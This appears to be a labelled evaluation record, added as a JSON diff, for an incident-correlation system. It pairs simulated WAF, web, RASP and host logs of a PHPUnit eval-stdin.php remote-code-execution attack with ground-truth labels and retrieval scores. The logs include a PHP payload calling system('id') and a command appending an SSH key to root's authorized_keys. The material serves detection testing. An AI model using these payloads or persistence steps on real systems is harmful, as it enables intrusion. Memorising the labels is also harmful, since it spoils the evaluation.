@@ -1,0 +1,117 @@
+{
+ "unit": 1067,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "PHPUnit eval-stdin.php 未授权远程代码执行",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-26 22:45:21",
+   "source": "waf",
+   "log_id": "WAF0379600",
+   "content": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?> Mozilla/5.0 (iPhone; CPU iPhone OS ",
+   "event_id": "1067-WAF0379600"
+  },
+  {
+   "timestamp": "2026-06-26 22:45:22",
+   "source": "web",
+   "log_id": "WEB0382070",
+   "content": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?> Mozilla/5.0 (iPhone; CPU iPhone OS ",
+   "event_id": "1067-WEB0382070"
+  },
+  {
+   "timestamp": "2026-06-26 22:45:23",
+   "source": "rasp",
+   "log_id": "RASP0419992",
+   "content": "https://app-php-46.ops-corp.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {\"eval_stdin\": \"system\", \"a",
+   "event_id": "1067-RASP0419992"
+  },
+  {
+   "timestamp": "2026-06-26 22:46:25",
+   "source": "hids",
+   "log_id": "HID0411374",
+   "content": "ps aux /bin/ps ps aux <== /bin/sh -c 'ps aux' <== php-fpm: pool www",
+   "event_id": "1067-HID0411374"
+  },
+  {
+   "timestamp": "2026-06-26 22:47:39",
+   "source": "hids",
+   "log_id": "HID0411381",
+   "content": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7kQd9Zc root@k\" >> /root/.ssh/authorized_keys echo echo <== /usr/",
+   "event_id": "1067-HID0411381"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-004",
+   "name": "Laravel Ignition 反序列化 RCE + cron 持久化",
+   "summary": "请求 _ignition/execute-solution 触发 phar 反序列化 → 应用侧记录 phar:// 载荷 → PHP-FPM 派生子 shell 执行 id → 追加 crontab 定时回连。",
+   "matched_steps": 0,
+   "total_steps": 4,
+   "shape": "none",
+   "longest_run": 0,
+   "tier": "keyword_only",
+   "order_ok": false,
+   "order_assessable": false,
+   "source_fit_ratio": 0.0,
+   "evidence": [],
+   "source_mismatches": [],
+   "keyword_score": 3,
+   "keyword_details": [
+    "keyword +3: php-fpm"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1053.003"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3",
+    "S4"
+   ],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "keyword_only",
+  "shape": "none",
+  "matched_steps": 0,
+  "total_steps": 4,
+  "order_ok": false,
+  "order_assessable": false,
+  "source_fit_ratio": 0.0,
+  "steps": [],
+  "unobserved_steps": [
+   "S1",
+   "S2",
+   "S3",
+   "S4"
+  ],
+  "gap_steps": [],
+  "before_steps": [],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 3,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1053.003"
+  ]
+ }
+}
